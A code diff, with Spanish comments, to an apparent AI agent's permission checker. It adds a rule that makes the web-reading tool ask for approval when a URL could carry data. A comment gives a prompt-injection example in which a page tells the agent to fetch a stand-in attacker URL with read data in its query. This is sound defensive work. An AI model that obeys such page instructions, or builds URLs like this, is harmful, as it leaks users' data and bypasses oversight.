@@ -418,6 +418,19 @@ def riesgo(nombre, args, raiz, *, sandbox=True):
         return 'maneja otro agente u otra app del Mac'
     if nombre.startswith('mcp__'):
         return 'llama a un servidor MCP, fuera del sandbox'
+    if nombre == 'read_web':
+        # Una página puede pedir «lee https://atacante/r?d=<lo que leíste>»: la petición misma saca los
+        # datos. Una dirección que puede llevarlos (consulta, fragmento, @ o una ruta larga) pide el sí,
+        # como ya lo pedía curl. web_search no: su consulta va al buscador, no a quien eligió la página.
+        from urllib.parse import urlsplit
+        url = str(args.get('url') or '')
+        try:
+            partes = urlsplit(url)
+        except ValueError:
+            return 'lee una dirección que no se entiende'
+        if partes.query or partes.fragment or '@' in url or len(partes.path) > 100:
+            return 'lee una dirección que puede llevar datos (' + url[:120] + ')'
+        return None
     if nombre in EDITORAS:
         rutas = rutas_de_edicion(nombre, args)
         if not rutas:
